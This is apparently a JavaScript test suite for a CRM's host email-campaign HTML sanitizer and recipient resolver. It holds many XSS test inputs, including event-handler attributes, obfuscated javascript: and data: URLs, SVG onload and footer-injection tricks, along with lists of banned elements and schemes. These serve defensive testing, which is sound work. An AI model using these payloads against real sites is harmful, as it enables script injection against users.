import { describe, it, expect, vi } from 'vitest'
import { parse } from 'parse5'
import { JSDOM } from 'jsdom'
import {
  sanitizeCampaignHtml,
  renderHostCampaignHtml,
  resolveHostRecipients,
  markupTagSpans,
} from './host-campaign-email'

// ---------------------------------------------------------------------------
// sanitizeCampaignHtml — host-authored body HTML is the ONLY unescaped input
// in a host campaign email; every dangerous construct must be stripped.
// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------
// PARSED-DOCUMENT ASSERTIONS (round-6 finding 5).
//
// Every handler/scheme assertion in this file used to be a SUBSTRING TEST on
// the sanitizer's string output, and that is exactly why 182 green tests
// shipped a critical XSS: `<img src=x onerror="alert(document.domain);'<a'">`
// sanitized to ITSELF, and `not.toContain('onerror')` was never written for
// the payloads that got through because nobody thought of them. A parser is
// not fooled the same way — it answers "does this document contain a live
// event-handler attribute", which is the question that matters — so the checks
// below walk parse5's tree (and jsdom's, where a second opinion is worth
// having) and the string assertions that remain are about FIDELITY, not
// safety.
//
// This is the same invariant the round-6 fuzz harness runs, kept here so the
// suite and the fuzz cannot drift apart.
// ---------------------------------------------------------------------------
const PARSED_UNSUB = 'https://crm.test/unsubscribe/host/parsed.sig'
const PARSED_HOST = { name: 'Acme Events', sender_name: 'Acme Team' }

// Nothing in this set may exist as an ELEMENT in a rendered campaign. `meta`
// is here too: the shell writes its own charset and the sanitizer re-emits one
// canonical viewport, and no other meta may survive (metaAllowed below).
const BANNED_ELEMENTS = new Set([
  'script', 'iframe', 'object', 'embed', 'form', 'base', 'link', 'svg', 'math',
  'select', 'option', 'optgroup', 'textarea', 'title', 'noscript', 'noframes',
  'noembed', 'meta', 'plaintext', 'xmp', 'template',
])
// An unsubscribe anchor inside one of these is TEXT, not a link.
const INERT_ANCESTORS = new Set([
  'script', 'style', 'textarea', 'title', 'template', 'select', 'noscript',
  'plaintext', 'xmp', 'noframes', 'noembed',
])
const URL_ATTRS = new Set(['href', 'src', 'poster', 'formaction', 'background', 'action', 'xlink:href'])
const OK_SCHEMES = new Set(['http', 'https', 'mailto', 'tel', 'cid'])
const URL_IGNORED = /[\u0000-\u0020\u00a0]/g

function decodeForCheck(value) {
  return String(value)
    .replace(/&#x([0-9a-f]+);?/gi, (_, h) => { const c = parseInt(h, 16); return Number.isFinite(c) && c <= 0x10ffff ? String.fromCodePoint(c) : '' })
    .replace(/&#(\d+);?/g, (_, d) => { const c = parseInt(d, 10); return Number.isFinite(c) && c <= 0x10ffff ? String.fromCodePoint(c) : '' })
    .replace(/&(colon|tab|newline|amp|quot|apos);?/gi, (_, n) => ({ colon: ':', tab: '\t', newline: '\n', amp: '&', quot: '"', apos: "'" }[n.toLowerCase()]))
}

function metaAllowed(attrs) {
  const m = new Map(attrs.map((a) => [a.name, a.value]))
  if (m.size === 1 && String(m.get('charset') || '').toLowerCase() === 'utf-8') return true
  return m.size === 2 && m.get('name') === 'viewport' && m.get('content') === 'width=device-width, initial-scale=1'
}

/** parse5's tree, flattened to { tag, attrs:[{name,value}], text, children }. */
function parse5Tree(html) {
  const conv = (n) => ({
    tag: n.tagName ? n.tagName.toLowerCase() : null,
    attrs: (n.attrs || []).map((a) => ({ name: (a.prefix ? `${a.prefix}:` : '') + a.name, value: a.value })),
    text: n.nodeName === '#text' ? n.value : undefined,
    children: (n.childNodes || []).map(conv),
  })
  return conv(parse(html))
}

/** jsdom's tree in the same shape, so ONE checker can run against both. */
function jsdomTree(html) {
  const conv = (n) => ({
    tag: n.nodeType === 1 ? n.tagName.toLowerCase() : null,
    attrs: n.nodeType === 1 ? Array.from(n.attributes).map((a) => ({ name: a.name, value: a.value })) : [],
    text: n.nodeType === 3 ? n.data : undefined,
    children: Array.from(n.childNodes || []).map(conv),
  })
  return conv(new JSDOM(html).window.document)
}

/**
 * THE INVARIANT, as a list of problems (empty = clean). One rendered campaign
 * must contain:
 *   - EXACTLY ONE `a[href]` equal to the unsubscribe URL, with no inert
 *     ancestor (a link inside script/style/title/textarea/template/select/
 *     noscript is text, not a link, and every round of this review has shipped
 *     a payload that turned it into one);
 *   - no banned element, and no meta beyond the shell's charset and the one
 *     canonical viewport;
 *   - NO attribute whose name starts with `on` — junk names like `on<p`
 *     included, because a name a regex cannot describe is still an attribute;
 *   - no URL attribute whose DECODED scheme is outside the allowlist;
 *   - no style attribute carrying expression()/javascript:/@import or an
 *     unparked remote url(), after decoding;
 *   - no `<` or `>` in a style element's body, which is what stops a restored
 *     stylesheet closing its own element.
 */
function invariantProblems(tree, unsub = PARSED_UNSUB) {
  const problems = []
  let unsubCount = 0
  const walk = (node, stack) => {
    if (node.tag) {
      const t = node.tag
      // The shell's own <title> in <head> holds the ESCAPED subject and is not
      // host-supplied.
      const shellTitle = t === 'title' && stack.length === 2 && stack[0] === 'html' && stack[1] === 'head'
      if (BANNED_ELEMENTS.has(t) && !shellTitle) {
        if (t !== 'meta') problems.push(`banned element ${t}`)
        else if (!metaAllowed(node.attrs)) problems.push(`banned meta ${JSON.stringify(node.attrs)}`)
      }
      for (const a of node.attrs) {
        const n = a.name.toLowerCase()
        if (n.startsWith('on')) problems.push(`on* attribute ${n}=${a.value}`)
        if (URL_ATTRS.has(n)) {
          const d = decodeForCheck(a.value).replace(URL_IGNORED, '')
          const m = /^([a-z][a-z0-9+.-]*):/i.exec(d)
          if (m && !OK_SCHEMES.has(m[1].toLowerCase())) problems.push(`bad scheme ${n}=${a.value}`)
        }
        if (n === 'style') {
          const v = decodeForCheck(a.value).toLowerCase()
          if (v.includes('expression(') || v.includes('javascript:') || v.includes('@import')) problems.push(`live css ${a.value.slice(0, 90)}`)
          if (/url\(\s*['"]?https?:/i.test(v)) problems.push(`remote css url ${a.value.slice(0, 90)}`)
        }
      }
      if (t === 'a' && node.attrs.some((a) => a.name.toLowerCase() === 'href' && a.value === unsub)) {
        unsubCount++
        for (const anc of stack) if (INERT_ANCESTORS.has(anc)) problems.push(`unsubscribe link inside ${anc}`)
      }
      if (t === 'style') {
        const body = (node.children || []).map((c) => c.text || '').join('')
        if (/[<>]/.test(body)) problems.push(`angle bracket in style body ${body.slice(0, 90)}`)
      }
    }
    const next = node.tag ? [...stack, node.tag] : stack
    for (const c of node.children || []) walk(c, next)
  }
  walk(tree, [])
  if (unsubCount !== 1) problems.push(`expected exactly 1 live unsubscribe anchor, found ${unsubCount}`)
  return problems
}

/** Render one host body BOTH ways: shell-wrapped, and as a full document. */
function renderBothPaths(bodyHtml, unsub = PARSED_UNSUB) {
  return {
    shell: renderHostCampaignHtml({ host: PARSED_HOST, subject: 'Subject <b>', bodyHtml, unsubscribeUrl: unsub }),
    doc: renderHostCampaignHtml({
      host: PARSED_HOST,
      subject: 'Subject <b>',
      bodyHtml: `<!DOCTYPE html><html><body><p>hi</p>${bodyHtml}</body></html>`,
      unsubscribeUrl: unsub,
    }),
  }
}

/**
 * Assert the full parsed invariant on BOTH render paths with parse5, and (when
 * asked) with jsdom as an independent second parser.
 */
function expectSafeBothPaths(bodyHtml, { jsdom = false, unsub = PARSED_UNSUB } = {}) {
  const rendered = renderBothPaths(bodyHtml, unsub)
  for (const [path, html] of Object.entries(rendered)) {
    expect({ path, problems: invariantProblems(parse5Tree(html), unsub) }).toEqual({ path, problems: [] })
    if (jsdom) expect({ path, problems: invariantProblems(jsdomTree(html), unsub) }).toEqual({ path, problems: [] })
  }
  return rendered
}

/**
 * EXACTLY ONE live unsubscribe anchor, with no inert ancestor.
 *
 * "At least one" was the old shape of this check, and it cannot see a document
 * that ships the footer twice; no ancestor check meant an anchor inside
 * <script>/<style>/<title>/<textarea>/<template>/<select>/<noscript> — text,
 * not a link — counted as a pass. Both are failure modes this file has shipped.
 */
function hasExactlyOneLiveUnsubLink(html, href) {
  let count = 0
  let inert = 0
  const walk = (node, stack) => {
    if (node.tag === 'a' && node.attrs.some((a) => a.name.toLowerCase() === 'href' && a.value === href)) {
      count++
      if (stack.some((t) => INERT_ANCESTORS.has(t))) inert++
    }
    const next = node.tag ? [...stack, node.tag] : stack
    for (const c of node.children || []) walk(c, next)
  }
  walk(parse5Tree(html), [])
  return count === 1 && inert === 0
}

/** Every attribute in a parsed fragment, as { tag, name, value }. */
function parsedAttributes(html) {
  const found = []
  const walk = (node) => {
    for (const a of node.attrs || []) found.push({ tag: node.tag, name: a.name.toLowerCase(), value: a.value })
    for (const c of node.children || []) walk(c)
  }
  walk(parse5Tree(html))
  return found
}

/**
 * Every attribute a browser would treat as an event handler — which means
 * every attribute whose NAME STARTS WITH `on`, junk names included. `on<p` is
 * not a handler any browser fires, but it is an attribute the sanitizer was
 * never able to see, and the same blindness is what let a real `onerror`
 * through (round-6 findings 1 and 4).
 */
function handlerAttrs(html) {
  return parsedAttributes(html).filter((a) => a.name.startsWith('on'))
}

/** Every URL attribute whose DECODED scheme is outside the allowlist. */
function badSchemeAttrs(html) {
  return parsedAttributes(html).filter((a) => {
    if (!URL_ATTRS.has(a.name)) return false
    const m = /^([a-z][a-z0-9+.-]*):/i.exec(decodeForCheck(a.value).replace(URL_IGNORED, ''))
    return !!m && !OK_SCHEMES.has(m[1].toLowerCase())
  })
}

/** Every element name in a parsed fragment. */
function parsedElements(html) {
  const found = []
  const walk = (node) => {
    if (node.tag) found.push(node.tag)
    for (const c of node.children || []) walk(c)
  }
  walk(parse5Tree(html))
  return found
}

describe('sanitizeCampaignHtml', () => {
  it('strips <script> tags WITH their content', () => {
    const out = sanitizeCampaignHtml('<p>hi</p><script>alert("x")</script><p>bye</p>')
    expect(out).not.toContain('script')
    expect(out).not.toContain('alert')
    expect(out).toBe('<p>hi</p><p>bye</p>')
  })

  it('keeps <style> tags, scrubbed, instead of stripping them (HOST-EMAILS.2)', () => {
    // Was "strips <style> tags WITH their content" — HOST-EMAILS.2 keeps
    // <style> so a Canva/Unlayer export stays responsive; the CSS itself is
    // still scrubbed (here the non-http(s) url() is parked to `none`).
    const out = sanitizeCampaignHtml('<style>body{background:url(evil)}</style><p>ok</p>')
    expect(out).toBe('<style>body{background:none}</style><p>ok</p>')
    expect(out).not.toContain('evil')
  })

  it('strips script tags case-insensitively and with attributes', () => {
    const out = sanitizeCampaignHtml('<SCRIPT src="https://x.ie/e.js"></SCRIPT><p>ok</p>')
    expect(out).toBe('<p>ok</p>')
  })

  it('strips a stray unclosed <script> open tag', () => {
    const out = sanitizeCampaignHtml('<p>a</p><script src="x.js">')
    expect(out).not.toContain('<script')
  })

  it('strips iframe / object / embed / form / link / meta tags', () => {
    const out = sanitizeCampaignHtml(
      '<iframe src="https://x.ie"></iframe><object data="x"></object>' +
      '<embed src="x"><form action="/steal"><input></form>' +
      '<link rel="stylesheet" href="x.css"><meta http-equiv="refresh" content="0">' +
      '<p>keep</p>'
    )
    expect(out).not.toMatch(/<\/?(iframe|object|embed|form|link|meta)\b/i)
    expect(out).toContain('<p>keep</p>')
  })

  it('strips on* event-handler attributes (double-quoted, single-quoted, bare)', () => {
    expect(sanitizeCampaignHtml('<img src="https://x.ie/a.png" onerror="alert(1)">')).not.toMatch(/onerror/i)
    expect(sanitizeCampaignHtml("<div onclick='alert(1)'>x</div>")).not.toMatch(/onclick/i)
    expect(sanitizeCampaignHtml('<div onmouseover=alert(1)>x</div>')).not.toMatch(/onmouseover/i)
    // case-insensitive
    expect(sanitizeCampaignHtml('<div ONCLICK="alert(1)">x</div>')).not.toMatch(/onclick/i)
  })

  it('keeps non-handler attributes intact while stripping handlers', () => {
    const out = sanitizeCampaignHtml('<img src="https://x.ie/a.png" alt="pic" onerror="alert(1)" width="100">')
    expect(out).toContain('src="https://x.ie/a.png"')
    expect(out).toContain('alt="pic"')
    expect(out).toContain('width="100"')
    expect(out).not.toMatch(/onerror/i)
  })

  it('neutralizes javascript: hrefs (any case / leading whitespace)', () => {
    expect(sanitizeCampaignHtml('<a href="javascript:alert(1)">x</a>')).not.toMatch(/javascript:/i)
    expect(sanitizeCampaignHtml('<a href="JaVaScRiPt:alert(1)">x</a>')).not.toMatch(/javascript:/i)
    expect(sanitizeCampaignHtml('<a href=" javascript:alert(1)">x</a>')).not.toMatch(/javascript:/i)
    expect(sanitizeCampaignHtml('<a href=javascript:alert(1)>x</a>')).not.toMatch(/javascript:/i)
  })

  it('neutralizes data: hrefs and srcs', () => {
    expect(sanitizeCampaignHtml('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>')).not.toMatch(/data:/i)
    expect(sanitizeCampaignHtml('<img src="data:image/svg+xml,<svg onload=alert(1)>">')).not.toMatch(/data:/i)
  })

  it('strips on* handlers separated by / or a quote instead of whitespace', () => {
    expect(sanitizeCampaignHtml('<img/onerror=alert(1) src="https://x.ie/a.png">')).not.toMatch(/onerror/i)
    expect(sanitizeCampaignHtml('<svg/onload=alert(1)>')).not.toMatch(/onload/i)
    expect(sanitizeCampaignHtml('<img src="https://x.ie/a.png"onerror="alert(1)">')).not.toMatch(/onerror/i)
  })

  it('strips svg and math tags', () => {
    const out = sanitizeCampaignHtml(
      '<svg><circle r="1"></circle></svg><math><mi>x</mi></math><p>keep</p>'
    )
    expect(out).not.toMatch(/<\/?(svg|math)\b/i)
    expect(out).toContain('<p>keep</p>')
  })

  it('neutralizes entity-encoded / control-obfuscated / unknown schemes (allowlist)', () => {
    // decimal + hex numeric entities
    expect(sanitizeCampaignHtml('<a href="&#106;avascript:alert(1)">x</a>')).toContain('href="#"')
    expect(sanitizeCampaignHtml('<a href="&#x6A;avascript:alert(1)">x</a>')).toContain('href="#"')
    // named entity colon
    expect(sanitizeCampaignHtml('<a href="javascript&colon;alert(1)">x</a>')).toContain('href="#"')
    // control chars inside the scheme
    expect(sanitizeCampaignHtml('<a href="jav\tascript:alert(1)">x</a>')).toContain('href="#"')
    // any scheme outside http/https/mailto/tel is neutralized — allowlist, not deny-list
    expect(sanitizeCampaignHtml('<a href="vbscript:msgbox(1)">x</a>')).toContain('href="#"')
    // benign absolute URLs with entities, mailto/tel, and relative/fragment URLs survive untouched
    const ok = '<a href="https://x.ie/?a=1&#38;b=2">x</a><a href="mailto:hi@x.ie">m</a><a href="tel:+3531234">t</a><a href="#section">s</a>'
    expect(sanitizeCampaignHtml(ok)).toBe(ok)
  })

  it('neutralizes dangerous xlink:href and slash-separated URL attributes', () => {
    expect(sanitizeCampaignHtml('<use xlink:href="javascript:alert(1)">')).not.toMatch(/javascript:/i)
    expect(sanitizeCampaignHtml('<img/src="javascript:alert(1)">')).not.toMatch(/javascript:/i)
  })

  it('keeps benign marketing markup untouched', () => {
    const html = '<h1>Sale!</h1><p>Hi <strong>there</strong>,<br>see <a href="https://acme.ie/offer">our offer</a>.</p><img src="https://acme.ie/hero.png" alt="hero">'
    expect(sanitizeCampaignHtml(html)).toBe(html)
  })

  it('returns an empty string for empty / non-string input', () => {
    expect(sanitizeCampaignHtml('')).toBe('')
    expect(sanitizeCampaignHtml(null)).toBe('')
    expect(sanitizeCampaignHtml(undefined)).toBe('')
    expect(sanitizeCampaignHtml(42)).toBe('')
  })
})

// ---------------------------------------------------------------------------
// renderHostCampaignHtml — the server-owned shell. Footer + unsubscribe link
// are injected HERE, after sanitization, so a host can never omit or strip
// them (they never touch host-authored input).
// ---------------------------------------------------------------------------
describe('renderHostCampaignHtml', () => {
  const host = { name: 'Acme Events', sender_name: 'Acme Team' }
  const unsub = 'https://crm.un1tdublin.com/unsubscribe/host/tok.sig'
  const render = (overrides = {}) =>
    renderHostCampaignHtml({
      host,
      subject: 'July offers',
      bodyHtml: '<p>Hello!</p>',
      unsubscribeUrl: unsub,
      ...overrides,
    })

  it('always contains the unsubscribe link and the mandatory footer copy', () => {
    const html = render()
    expect(html).toContain(`href="${unsub}"`)
    expect(html).toContain('Unsubscribe')
    expect(html).toContain('Acme Events')
    expect(html).toContain('attended an event or joined the mailing list')
  })

  it('keeps the footer + unsubscribe link even when the body tries to close the document', () => {
    const html = render({ bodyHtml: '<p>bye</p></td></table></body></html>' })
    const bodyIdx = html.indexOf('<p>bye</p>')
    const unsubIdx = html.indexOf(`href="${unsub}"`)
    expect(bodyIdx).toBeGreaterThan(-1)
    expect(unsubIdx).toBeGreaterThan(bodyIdx) // footer renders AFTER the body slot
    expect(html).toContain('attended an event or joined the mailing list')
  })

  it('shows the sender_name header, falling back to the host name', () => {
    expect(render()).toContain('Acme Team')
    const noSender = render({ host: { name: 'Acme Events', sender_name: null } })
    expect(noSender).toContain('Acme Events')
  })

  it('escapes host-controlled strings (sender_name, name, subject)', () => {
    const html = render({
      host: { name: 'A & B <Events>', sender_name: '<script>alert(1)</script>' },
      subject: '<img src=x>',
    })
    expect(html).not.toContain('<script>alert(1)</script>')
    expect(html).toContain('&lt;script&gt;')
    expect(html).toContain('A &amp; B &lt;Events&gt;')
    expect(html).not.toContain('<img src=x>')
  })

  it('sanitizes the host-authored body (script stripped, handlers stripped)', () => {
    const html = render({ bodyHtml: '<p onclick="p()">Hi</p><script>steal()</script>' })
    expect(html).not.toContain('steal()')
    expect(html).not.toMatch(/onclick/i)
    expect(html).toContain('Hi')
  })

  it('tolerates a null-ish host and empty body', () => {
    const html = renderHostCampaignHtml({ host: null, subject: 's', bodyHtml: '', unsubscribeUrl: unsub })
    expect(html).toContain(`href="${unsub}"`)
    expect(html).toContain('Unsubscribe')
  })
})

// ---------------------------------------------------------------------------
// resolveHostRecipients — fakeDb mirrors host-contact-list.test.js: pages of
// host_contacts (joined contact) + host_email_suppressions rows.
// ---------------------------------------------------------------------------
function fakeRecipientsDb({ contactPages = [[]], suppressions = [] } = {}) {
  const calls = { hostFilters: [], contactRanges: [], selects: [] }
  let contactCall = 0
  return {
    calls,
    from(table) {
      if (table === 'host_contacts') {
        return {
          select: (cols) => {
            calls.selects.push([table, cols])
            return {
              eq: (col, val) => {
                calls.hostFilters.push([table, col, val])
                let sourceFilter = col === 'source' ? val : null
                const chain = {
                  eq: (col2, val2) => {
                    calls.hostFilters.push([table, col2, val2])
                    if (col2 === 'source') sourceFilter = val2
                    return chain
                  },
                  order: () => chain,
                  range: async (from, to) => {
                    calls.contactRanges.push({ from, to })
                    let page = contactPages[contactCall] || []
                    contactCall++
                    if (sourceFilter) page = page.filter((r) => r.source === sourceFilter)
                    return { data: page, error: null }
                  },
                }
                return chain
              },
            }
          },
        }
      }
      if (table === 'host_email_suppressions') {
        return {
          select: (cols) => {
            calls.selects.push([table, cols])
            return {
              eq: (col, val) => {
                calls.hostFilters.push([table, col, val])
                const chain = { order: () => chain, range: async () => ({ data: suppressions, error: null }) }
                return chain
              },
            }
          },
        }
      }
      throw new Error('unexpected table ' + table)
    },
  }
}

const member = (contactId, contact, marketing_consent = true) => ({ contact_id: contactId, marketing_consent, contact })
// email_marketing stays in the fixture on purpose: the host gate must IGNORE it (HOST-CONSENT.1).
const goodContact = (id, email) => ({
  id, email, email_marketing: true, email_status: 'active', email_suppressed_at: null,
})

describe('resolveHostRecipients', () => {
  it('scopes BOTH queries to the host_id (tenancy)', async () => {
    const db = fakeRecipientsDb()
    await resolveHostRecipients(db, 'h1')
    expect(db.calls.hostFilters).toEqual([
      ['host_email_suppressions', 'host_id', 'h1'],
      ['host_contacts', 'host_id', 'h1'],
    ])
  })

  it('HOST-CONSENT.1 — selects host_contacts.marketing_consent and never contacts.email_marketing', async () => {
    const db = fakeRecipientsDb()
    await resolveHostRecipients(db, 'h1')
    const [, cols] = db.calls.selects.find(([t]) => t === 'host_contacts')
    expect(cols).toMatch(/marketing_consent/)
    expect(cols).toMatch(/contacts!contact_id/)
    expect(cols).not.toMatch(/email_marketing/)
  })

  it('returns {contact_id, email} for emailable contacts only', async () => {
    const db = fakeRecipientsDb({
      contactPages: [[
        member('c1', goodContact('c1', 'a@x.ie')),
        member('c2', goodContact('c2', 'b@x.ie'), false),
        member('c3', { ...goodContact('c3', 'c@x.ie'), email_status: 'bounced' }),
        member('c4', null), // broken join — tolerated, skipped
      ]],
    })
    expect(await resolveHostRecipients(db, 'h1')).toEqual([{ contact_id: 'c1', email: 'a@x.ie' }])
  })

  it('HOST-CONSENT.1 — includes a UN1T-opted-out contact who consented to the host, excludes one who did not', async () => {
    const db = fakeRecipientsDb({
      contactPages: [[
        member('c1', { ...goodContact('c1', 'a@x.ie'), email_marketing: false }, true),
        member('c2', goodContact('c2', 'b@x.ie'), false),
      ]],
    })
    expect(await resolveHostRecipients(db, 'h1')).toEqual([{ contact_id: 'c1', email: 'a@x.ie' }])
  })

  it('excludes per-host suppressed contacts', async () => {
    const db = fakeRecipientsDb({
      contactPages: [[member('c1', goodContact('c1', 'a@x.ie')), member('c2', goodContact('c2', 'b@x.ie'))]],
      suppressions: [{ contact_id: 'c1' }],
    })
    expect(await resolveHostRecipients(db, 'h1')).toEqual([{ contact_id: 'c2', email: 'b@x.ie' }])
  })

  it('dedupes by lowercased email — first (newest membership) wins', async () => {
    const db = fakeRecipientsDb({
      contactPages: [[
        member('c1', goodContact('c1', 'Pat@X.ie')),
        member('c2', goodContact('c2', 'pat@x.ie')),
        member('c3', goodContact('c3', 'other@x.ie')),
      ]],
    })
    expect(await resolveHostRecipients(db, 'h1')).toEqual([
      { contact_id: 'c1', email: 'Pat@X.ie' },
      { contact_id: 'c3', email: 'other@x.ie' },
    ])
  })

  it('paginates past the 1000-row select cap', async () => {
    const page1 = Array.from({ length: 1000 }, (_, i) => member(`c${i}`, goodContact(`c${i}`, `u${i}@x.ie`)))
    const page2 = [member('last', goodContact('last', 'last@x.ie'))]
    const db = fakeRecipientsDb({ contactPages: [page1, page2] })
    const rows = await resolveHostRecipients(db, 'h1')
    expect(rows).toHaveLength(1001)
    expect(db.calls.contactRanges).toEqual([{ from: 0, to: 999 }, { from: 1000, to: 1999 }])
  })

  it('mailingListOnly restricts the query to source=mailing_list', async () => {
    const db = fakeRecipientsDb({
      contactPages: [[
        { ...member('c1', goodContact('c1', 'a@x.ie')), source: 'event' },
        { ...member('c2', goodContact('c2', 'b@x.ie')), source: 'mailing_list' },
      ]],
    })
    const out = await resolveHostRecipients(db, 'h1', { mailingListOnly: true })
    expect(db.calls.hostFilters).toContainEqual(['host_contacts', 'source', 'mailing_list'])
    expect(out).toEqual([{ contact_id: 'c2', email: 'b@x.ie' }])
  })

  it('default leaves the source unfiltered', async () => {
    const db = fakeRecipientsDb({
      contactPages: [[
        { ...member('c1', goodContact('c1', 'a@x.ie')), source: 'event' },
        { ...member('c2', goodContact('c2', 'b@x.ie')), source: 'mailing_list' },
      ]],
    })
    const out = await resolveHostRecipients(db, 'h1')
    expect(db.calls.hostFilters.some(([t, c]) => t === 'host_contacts' && c === 'source')).toBe(false)
    expect(out.map((r) => r.contact_id).sort()).toEqual(['c1', 'c2'])
  })
})

// HOST-EMAIL.4 — visual composer + per-event audience.
describe('renderHostCampaignHtml — full-document (Unlayer) campaigns', () => {
  const host = { name: 'Pride Training Club', sender_name: 'Pride Training Club' }
  it('injects the footer before </body> instead of shell-wrapping', () => {
    const doc = '<!DOCTYPE html><html><head><title>x</title></head><body><table><tr><td>Hi</td></tr></table></body></html>'
    const out = renderHostCampaignHtml({ host, subject: 'S', bodyHtml: doc, unsubscribeUrl: 'https://x/u/t' })
    expect(out.match(/<!DOCTYPE html>/gi)).toHaveLength(1)
    expect(out).toContain('Unsubscribe')
    expect(out.indexOf('Unsubscribe')).toBeLessThan(out.indexOf('</body>'))
  })
  it('still sanitizes active content inside a full document', () => {
    const doc = '<html><body><script>alert(1)</script><p onclick="x()">Hi</p></body></html>'
    const out = renderHostCampaignHtml({ host, subject: 'S', bodyHtml: doc, unsubscribeUrl: 'https://x/u/t' })
    expect(out).not.toContain('<script')
    expect(out).not.toContain('onclick')
    expect(out).toContain('Unsubscribe')
  })
  it('the footer goes at the REAL </body>, not one inside a comment (round-6 fuzz)', () => {
    // `renderHostCampaignHtml` used a regex to find `</body>`, so a host body
    // containing `<!--</body>-->` had the ENTIRE mandatory footer injected
    // inside that comment: the source still said "Unsubscribe" and the parsed
    // document had no anchor at all. The insertion point comes from the
    // tokenizer walk now, which knows a comment from an end tag.
    expectSafeBothPaths('<p>Sale</p><!--</body>-->')
    // The same one indirection out: a `</body>` inside an Outlook conditional
    // block is comment data to every other client.
    expectSafeBothPaths('<!--[if mso]><div></body><![endif]--><p>x</p>')
    // And with the trap FIRST in a full document, which is the shape the fuzz
    // generated.
    const html = renderHostCampaignHtml({
      host: { name: 'Acme', sender_name: 'Acme' },
      subject: 's',
      bodyHtml: '<!DOCTYPE html><html><body><!--</body>--><p>hi</p></body></html>',
      unsubscribeUrl: PARSED_UNSUB,
    })
    expect(invariantProblems(parse5Tree(html))).toEqual([])
    expect(invariantProblems(jsdomTree(html))).toEqual([])
  })

  it('plain fragments keep the branded shell', () => {
    const out = renderHostCampaignHtml({ host, subject: 'S', bodyHtml: '<p>Hi</p>', unsubscribeUrl: 'https://x/u/t' })
    expect(out).toContain('border-radius:12px')
    expect(out).toContain('Unsubscribe')
  })
})

describe('resolveHostRecipients — per-event audience', () => {
  function eventDb({ attendees, hostContacts }) {
    return {
      from(table) {
        let filters = {}
        const b = {
          select: () => b,
          eq: (col, val) => { filters[col] = val; return b },
          order: () => b,
          range: async () => {
            if (table === 'race_registrations') {
              return { data: attendees.map((id) => ({ id: `r-${id}`, teams: { team_members: [{ contact_id: id }] } })), error: null }
            }
            if (table === 'host_email_suppressions') return { data: [], error: null }
            if (table === 'host_contacts') {
              return {
                data: hostContacts.map((id) => ({
                  contact_id: id,
                  marketing_consent: true,
                  contact: { id, email: `${id}@x.com`, email_marketing: true, email_status: 'active', email_suppressed_at: null },
                })),
                error: null,
              }
            }
            return { data: [], error: null }
          },
        }
        return b
      },
    }
  }

  it('restricts to the event attendees when audienceEventId is set', async () => {
    const db = eventDb({ attendees: ['a', 'b'], hostContacts: ['a', 'b', 'c'] })
    const out = await resolveHostRecipients(db, 'h1', { audienceEventId: 'ev1' })
    expect(out.map((r) => r.contact_id).sort()).toEqual(['a', 'b'])
  })

  it('no audience → every host contact (unchanged)', async () => {
    const db = eventDb({ attendees: [], hostContacts: ['a', 'b', 'c'] })
    const out = await resolveHostRecipients(db, 'h1')
    expect(out).toHaveLength(3)
  })

  it('event with zero attendees → empty, no contact scan', async () => {
    const db = eventDb({ attendees: [], hostContacts: ['a'] })
    const out = await resolveHostRecipients(db, 'h1', { audienceEventId: 'ev1' })
    expect(out).toEqual([])
  })
})

// resolveHostRecipients — nonOpenersOf (HOST-EMAILS.2). A chainable ops-
// tracking fake (same shape as host-campaign-launch.test.js's makeDb) so the
// exact filters applied to host_campaign_sends can be asserted AND used to
// compute the fake's own canned response — the way a real .is()/.not() chain
// would narrow the rows.
describe('resolveHostRecipients — nonOpenersOf', () => {
  const HOST_ID = 'h1'
  const PARENT = 'p0000000-0000-0000-0000-0000000000p1'

  const SEND_ROWS = [
    { contact_id: 'c1', campaign_id: PARENT, status: 'sent', delivered_at: '2026-09-01T00:00:00Z', opened_at: null, clicked_at: null, bounced_at: null, complained_at: null, unsubscribed_at: null },
    { contact_id: 'c2', campaign_id: PARENT, status: 'sent', delivered_at: '2026-09-01T00:00:00Z', opened_at: '2026-09-02T00:00:00Z', clicked_at: null, bounced_at: null, complained_at: null, unsubscribed_at: null },
    { contact_id: 'c3', campaign_id: PARENT, status: 'sent', delivered_at: '2026-09-01T00:00:00Z', opened_at: null, clicked_at: null, bounced_at: '2026-09-01T01:00:00Z', complained_at: null, unsubscribed_at: null },
    // c5 — delivered/unopened/unclicked/unbounced/uncomplained/unsubscribed:
    // qualifies under the sends-history filter, so only the normal
    // emailability gate (host_contacts.marketing_consent, below) can exclude
    // it. Pins that the gate actually runs — see HOST_CONTACTS.
    { contact_id: 'c5', campaign_id: PARENT, status: 'sent', delivered_at: '2026-09-01T00:00:00Z', opened_at: null, clicked_at: null, bounced_at: null, complained_at: null, unsubscribed_at: null },
    // c6 — never delivered (delivered_at null). Excluded by the resolver's
    // `.not('delivered_at', 'is', null)` — this fake only drops the row when
    // that exact op is present (see applySendsOps' 'not'/'is' branch), so a
    // resolver that forgot the filter would leak c6 through.
    { contact_id: 'c6', campaign_id: PARENT, status: 'sent', delivered_at: null, opened_at: null, clicked_at: null, bounced_at: null, complained_at: null, unsubscribed_at: null },
    // c7 — complained. Excluded by `.is('complained_at', null)`.
    { contact_id: 'c7', campaign_id: PARENT, status: 'sent', delivered_at: '2026-09-01T00:00:00Z', opened_at: null, clicked_at: null, bounced_at: null, complained_at: '2026-09-01T02:00:00Z', unsubscribed_at: null },
    // c8 — unsubscribed. Excluded by `.is('unsubscribed_at', null)`.
    { contact_id: 'c8', campaign_id: PARENT, status: 'sent', delivered_at: '2026-09-01T00:00:00Z', opened_at: null, clicked_at: null, bounced_at: null, complained_at: null, unsubscribed_at: '2026-09-01T03:00:00Z' },
  ]

  const HOST_CONTACTS = [
    ...['c1', 'c2', 'c3', 'c4'].map((id) => ({
      contact_id: id,
      marketing_consent: true,
      contact: { id, email: `${id}@x.ie`, email_marketing: true, email_status: 'active', email_suppressed_at: null },
    })),
    // c5 passes every sends-history filter above — only a withdrawn
    // host_contacts.marketing_consent (the normal emailability gate) can
    // still keep it out. If resolveHostRecipients's isEmailable() call were
    // deleted, c5 would leak through and the "then the normal emailability
    // gate" test's `toEqual(['c1'])` assertion below would fail (c5 would
    // appear in the result).
    {
      contact_id: 'c5',
      marketing_consent: false,
      contact: { id: 'c5', email: 'c5@x.ie', email_marketing: true, email_status: 'active', email_suppressed_at: null },
    },
  ]

  function applySendsOps(rows, ops) {
    return rows.filter((row) => ops.every((o) => {
      if (o.method === 'eq') return row[o.args[0]] === o.args[1]
      if (o.method === 'is') return row[o.args[0]] === o.args[1]
      if (o.method === 'not' && o.args[1] === 'is') return row[o.args[0]] !== o.args[2]
      return true
    }))
  }

  function makeDb(route) {
    const statements = []
